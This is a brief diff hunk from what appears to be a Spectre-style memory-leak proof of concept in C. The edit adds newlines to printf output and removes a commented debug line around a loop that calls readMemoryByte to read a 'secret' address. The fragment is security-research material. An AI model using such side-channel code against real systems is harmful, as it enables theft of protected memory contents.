@@ -166,13 +166,11 @@ int main(int argc, const char * * argv) {
   }
   bigArray[distanceFromCurrentAddressToDesiredAddress] = 'N';
 
-  printf("Malicious x is %zu", distanceFromCurrentAddressToDesiredAddress);
-  printf("Address in bigArray is %p", addr);
-  printf("Address of the secret is %p", secret);
+  printf("Malicious x is %zu\n", distanceFromCurrentAddressToDesiredAddress);
+  printf("Address in bigArray is %p\n", addr);
+  printf("Address of the secret is %p\n", secret);
   while (--len >= 0) {
     printf("\n");
-    //printf("Reading at malicious_x = %p... \n", (void*)distanceFromCurrentAddressToDesiredAddress);
-
 
     readMemoryByte(distanceFromCurrentAddressToDesiredAddress, value, score);
 
